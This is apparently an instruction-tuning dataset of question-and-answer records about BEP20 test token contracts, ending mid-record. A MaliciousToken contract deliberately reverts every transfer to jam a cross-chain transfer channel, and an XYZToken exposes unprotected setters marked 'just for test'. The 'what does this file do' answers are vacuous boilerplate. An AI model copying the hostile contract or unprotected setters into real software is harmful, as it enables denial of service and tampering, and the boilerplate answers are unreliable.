{"instruction": "What does the file ABCToken.sol do?", "input": "```sol\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Context.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\nimport \"../interface/ITestToken.sol\";\n\ncontract ABCToken is Context, ITestToken, Ownable {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n    uint8 public _decimals;\n    string public _symbol;\n    string public _name;\n\n    constructor() {\n        _name = \"ABC token\";\n        _symbol = \"ABC\";\n        _decimals = 18;\n        _totalSupply = 100000000000000000000000000;\n        _balances[msg.sender] = _totalSupply;\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    /**\n     * @dev Returns the bep token owner.\n     */\n    function getOwner() external view returns (address) {\n        return owner();\n    }\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() external view returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() external view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the token name.\n     */\n    function name() external view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev See {BEP20-totalSupply}.\n     */\n    function totalSupply() external view returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {BEP20-balanceOf}.\n     */\n    function balanceOf(address account) external view returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {BEP20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    /**\n     * @d\n```", "output": "This file `ABCToken.sol` is part of the test_token project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for DEFToken.sol which is part of the test_token project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\test_token\\DEFToken.sol`:\n\n```sol\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Context.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\nimport \"../interface/ITestToken.sol\";\n\ncontract DEFToken is Context, ITestToken, Ownable {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n    uint8 public _decimals;\n    string public _symbol;\n    string public _name;\n\n    constructor() {\n        _name = \"DEF token\";\n        _symbol = \"DEF\";\n        _decimals = 18;\n        _totalSupply = 100000000000000000000000000;\n        _balances[msg.sender] = _totalSupply;\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    /**\n     * @dev Returns the bep token owner.\n     */\n    function getOwner() external view returns (address) {\n        return owner();\n    }\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() external view returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() external view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the token name.\n     */\n    function name() external view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev See {BEP20-totalSupply}.\n     */\n    function totalSupply() external view returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {BEP20-balanceOf}.\n     */\n    function balanceOf(address account) external view returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {BEP20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {BEP20-allowance}.\n     */\n    function allowance(address owner, address spender) external view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {BEP20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) external returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {BEP20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {BEP20};\n     *\n     * Requirements:\n     * - `sender` and `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     * - the caller must have allowance for `sender`'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n        require(_allowances[sender][_msgSender()] >= amount, \"BEP20: transfer amount exceeds allowance\");\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {BEP20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {BEP20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);\n        return true;\n    }\n\n    /**\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n     *\n     * This is internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `sender` cannot be the zero address.\n     * - `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     */\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n        require(sender != address(0), \"BEP20: transfer from the zero address\");\n        require(recipient != address(0), \"BEP20: transfer to the zero address\");\n\n        _balances[sender] = _balances[sender] - amount;\n        _balances[recipient] = _balances[recipient] + amount;\n        emit Transfer(sender, recipient, amount);\n    }\n\n    /**\n     * @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `to` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal {\n        require(account != address(0), \"BEP20: mint to the zero address\");\n\n        _totalSupply = _totalSupply + amount;\n        _balances[account] = _balances[account] + amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal {\n        require(account != address(0), \"BEP20: burn from the zero address\");\n\n        _balances[account] = _balances[account] - amount;\n        _totalSupply = _totalSupply - amount;\n        emit Transfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n     *\n     * This is internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(address owner, address spender, uint256 amount) internal {\n        require(owner != address(0), \"BEP20: approve from the zero address\");\n        require(spender != address(0), \"BEP20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`.`amount` is then deducted\n     * from the caller's allowance.\n     *\n     * See {_burn} and {_approve}.\n     */\n    function _burnFrom(address account, uint256 amount) internal {\n        _burn(account, amount);\n        _approve(account, _msgSender(), _allowances[account][_msgSender()] - amount);\n    }\n}\n\n```"}
{"instruction": "What does the file DEFToken.sol do?", "input": "```sol\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Context.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\nimport \"../interface/ITestToken.sol\";\n\ncontract DEFToken is Context, ITestToken, Ownable {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n    uint8 public _decimals;\n    string public _symbol;\n    string public _name;\n\n    constructor() {\n        _name = \"DEF token\";\n        _symbol = \"DEF\";\n        _decimals = 18;\n        _totalSupply = 100000000000000000000000000;\n        _balances[msg.sender] = _totalSupply;\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    /**\n     * @dev Returns the bep token owner.\n     */\n    function getOwner() external view returns (address) {\n        return owner();\n    }\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() external view returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() external view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the token name.\n     */\n    function name() external view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev See {BEP20-totalSupply}.\n     */\n    function totalSupply() external view returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {BEP20-balanceOf}.\n     */\n    function balanceOf(address account) external view returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {BEP20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    /**\n     * @d\n```", "output": "This file `DEFToken.sol` is part of the test_token project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for MaliciousToken.sol which is part of the test_token project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\test_token\\MaliciousToken.sol`:\n\n```sol\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Context.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\nimport \"../interface/ITestToken.sol\";\n\ncontract MaliciousToken is Context, ITestToken, Ownable {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n    uint8 public _decimals;\n    string public _symbol;\n    string public _name;\n\n    constructor() {\n        _name = \"Malicious token\";\n        _symbol = \"MALICIOU\";\n        _decimals = 18;\n        _totalSupply = 100000000000000000000000000;\n        _balances[msg.sender] = _totalSupply;\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    /**\n     * @dev Returns the bep token owner.\n     */\n    function getOwner() external view returns (address) {\n        return owner();\n    }\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() external view returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() external view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the token name.\n     */\n    function name() external view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev See {BEP20-totalSupply}.\n     */\n    function totalSupply() external view returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {BEP20-balanceOf}.\n     */\n    function balanceOf(address account) external view returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev This is a malicious method. It is intended to stuck the transferIn channel\n     */\n    function transfer(address, uint256) external pure returns (bool) {\n        revert(\"malicious method\");\n    }\n\n    /**\n     * @dev See {BEP20-allowance}.\n     */\n    function allowance(address owner, address spender) external view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {BEP20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) external returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {BEP20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {BEP20};\n     *\n     * Requirements:\n     * - `sender` and `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     * - the caller must have allowance for `sender`'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n        require(_allowances[sender][_msgSender()] >= amount, \"BEP20: transfer amount exceeds allowance\");\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {BEP20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {BEP20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);\n        return true;\n    }\n\n    /**\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n     *\n     * This is internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `sender` cannot be the zero address.\n     * - `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     */\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n        require(sender != address(0), \"BEP20: transfer from the zero address\");\n        require(recipient != address(0), \"BEP20: transfer to the zero address\");\n\n        _balances[sender] = _balances[sender] - amount;\n        _balances[recipient] = _balances[recipient] + amount;\n        emit Transfer(sender, recipient, amount);\n    }\n\n    /**\n     * @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `to` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal {\n        require(account != address(0), \"BEP20: mint to the zero address\");\n\n        _totalSupply = _totalSupply + amount;\n        _balances[account] = _balances[account] + amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal {\n        require(account != address(0), \"BEP20: burn from the zero address\");\n\n        _balances[account] = _balances[account] - amount;\n        _totalSupply = _totalSupply - amount;\n        emit Transfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n     *\n     * This is internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(address owner, address spender, uint256 amount) internal {\n        require(owner != address(0), \"BEP20: approve from the zero address\");\n        require(spender != address(0), \"BEP20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`.`amount` is then deducted\n     * from the caller's allowance.\n     *\n     * See {_burn} and {_approve}.\n     */\n    function _burnFrom(address account, uint256 amount) internal {\n        _burn(account, amount);\n        _approve(account, _msgSender(), _allowances[account][_msgSender()] - amount);\n    }\n}\n\n```"}
{"instruction": "What does the file MaliciousToken.sol do?", "input": "```sol\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Context.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\nimport \"../interface/ITestToken.sol\";\n\ncontract MaliciousToken is Context, ITestToken, Ownable {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n    uint8 public _decimals;\n    string public _symbol;\n    string public _name;\n\n    constructor() {\n        _name = \"Malicious token\";\n        _symbol = \"MALICIOU\";\n        _decimals = 18;\n        _totalSupply = 100000000000000000000000000;\n        _balances[msg.sender] = _totalSupply;\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    /**\n     * @dev Returns the bep token owner.\n     */\n    function getOwner() external view returns (address) {\n        return owner();\n    }\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() external view returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() external view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the token name.\n     */\n    function name() external view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev See {BEP20-totalSupply}.\n     */\n    function totalSupply() external view returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {BEP20-balanceOf}.\n     */\n    function balanceOf(address account) external view returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev This is a malicious method. It is intended to stuck the transferIn channel\n     */\n    function transfer(address, uint256) external pure returns (bool) {\n        revert(\"malicious method\");\n    }\n\n    /**\n     * @dev See {BEP20-allowance}.\n     */\n    function allowance(address owner, address spender) external view returns (uint256) {\n  \n```", "output": "This file `MaliciousToken.sol` is part of the test_token project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for MiniToken.sol which is part of the test_token project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\test_token\\MiniToken.sol`:\n\n```sol\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Context.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\nimport \"../interface/ITestToken.sol\";\n\ncontract MiniToken is Context, ITestToken, Ownable {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n    uint8 public _decimals;\n    string public _symbol;\n    string public _name;\n\n    constructor() {\n        _name = \"XYZ token\";\n        _symbol = \"XYZ\";\n        _decimals = 18;\n        _totalSupply = 10000000000000000000000;\n        _balances[msg.sender] = _totalSupply;\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    /**\n     * @dev Returns the bep token owner.\n     */\n    function getOwner() external view returns (address) {\n        return owner();\n    }\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() external view returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() external view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the token name.\n     */\n    function name() external view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev See {BEP20-totalSupply}.\n     */\n    function totalSupply() external view returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {BEP20-balanceOf}.\n     */\n    function balanceOf(address account) external view returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {BEP20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {BEP20-allowance}.\n     */\n    function allowance(address owner, address spender) external view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {BEP20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) external returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {BEP20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {BEP20};\n     *\n     * Requirements:\n     * - `sender` and `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     * - the caller must have allowance for `sender`'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n        require(_allowances[sender][_msgSender()] >= amount, \"BEP20: transfer amount exceeds allowance\");\n        _transfer(sender, recipient, amount);\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {BEP20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {BEP20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);\n        return true;\n    }\n\n    /**\n     * @dev Moves tokens `amount` from `sender` to `recipient`.\n     *\n     * This is internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `sender` cannot be the zero address.\n     * - `recipient` cannot be the zero address.\n     * - `sender` must have a balance of at least `amount`.\n     */\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n        require(sender != address(0), \"BEP20: transfer from the zero address\");\n        require(recipient != address(0), \"BEP20: transfer to the zero address\");\n\n        _balances[sender] = _balances[sender] - amount;\n        _balances[recipient] = _balances[recipient] + amount;\n        emit Transfer(sender, recipient, amount);\n    }\n\n    /**\n     * @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `to` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal {\n        require(account != address(0), \"BEP20: mint to the zero address\");\n\n        _totalSupply = _totalSupply + amount;\n        _balances[account] = _balances[account] + amount;\n        emit Transfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal {\n        require(account != address(0), \"BEP20: burn from the zero address\");\n\n        _balances[account] = _balances[account] - amount;\n        _totalSupply = _totalSupply - amount;\n        emit Transfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.\n     *\n     * This is internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(address owner, address spender, uint256 amount) internal {\n        require(owner != address(0), \"BEP20: approve from the zero address\");\n        require(spender != address(0), \"BEP20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`.`amount` is then deducted\n     * from the caller's allowance.\n     *\n     * See {_burn} and {_approve}.\n     */\n    function _burnFrom(address account, uint256 amount) internal {\n        _burn(account, amount);\n        _approve(account, _msgSender(), _allowances[account][_msgSender()] - amount);\n    }\n}\n\n```"}
{"instruction": "What does the file MiniToken.sol do?", "input": "```sol\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Context.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\nimport \"../interface/ITestToken.sol\";\n\ncontract MiniToken is Context, ITestToken, Ownable {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n    uint8 public _decimals;\n    string public _symbol;\n    string public _name;\n\n    constructor() {\n        _name = \"XYZ token\";\n        _symbol = \"XYZ\";\n        _decimals = 18;\n        _totalSupply = 10000000000000000000000;\n        _balances[msg.sender] = _totalSupply;\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    /**\n     * @dev Returns the bep token owner.\n     */\n    function getOwner() external view returns (address) {\n        return owner();\n    }\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() external view returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() external view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the token name.\n     */\n    function name() external view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev See {BEP20-totalSupply}.\n     */\n    function totalSupply() external view returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {BEP20-balanceOf}.\n     */\n    function balanceOf(address account) external view returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {BEP20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    /**\n     * @dev \n```", "output": "This file `MiniToken.sol` is part of the test_token project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for XYZToken.sol which is part of the test_token project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\test_token\\XYZToken.sol`:\n\n```sol\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/utils/Context.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\nimport \"../interface/ITestToken.sol\";\n\ncontract XYZToken is Context, ITestToken, Ownable {\n    mapping(address => uint256) private _balances;\n\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n    uint8 private _decimals;\n    string private _symbol;\n    string private _name;\n\n    constructor() {\n        _name = \"XYZ token\";\n        _symbol = \"XYZ\";\n        _decimals = 18;\n        _totalSupply = 100000000000000000000000000;\n        _balances[msg.sender] = _totalSupply;\n\n        emit Transfer(address(0), msg.sender, _totalSupply);\n    }\n\n    /**\n     * @dev Just for test\n     *\n     * - `newName` new name\n     */\n    function setName(string calldata newName) external {\n        _name = newName;\n    }\n\n    /**\n     * @dev Just for test\n     *\n     * - `newDecimals` new decimals\n     */\n    function setDecimals(uint8 newDecimals) external {\n        _decimals = newDecimals;\n    }\n\n    /**\n     * @dev Just for test\n     *\n     * - `newTotalSupply` new totalSupply\n     */\n    function setTotalSupply(uint256 newTotalSupply) external {\n        _totalSupply = newTotalSupply;\n    }\n\n    /**\n     * @dev Just for test\n     *\n     * - `newSymbol` new symbol\n     */\n    function setSymbol(string calldata newSymbol) external {\n        _symbol = newSymbol;\n    }\n\n    /**\n     * @dev Returns the bep token owner.\n     */\n    function getOwner() external view returns (address) {\n        return owner();\n    }\n\n    /**\n     * @dev Returns the token decimals.\n     */\n    function decimals() external view returns (uint8) {\n        return _decimals;\n    }\n\n    /**\n     * @dev Returns the token symbol.\n     */\n    function symbol() external view returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the token name.\n     */\n    function name() external view returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev See {BEP20-totalSupply}.\n     */\n    function totalSupply() external view returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {BEP20-balanceOf}.\n     */\n    function balanceOf(address account) external view returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {BEP20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `recipient` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address recipient, uint256 amount) external returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {BEP20-allowance}.\n     */\n    function allowance(address owner, address spender) external view returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {BEP20-approve}.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) external returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {BEP20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. 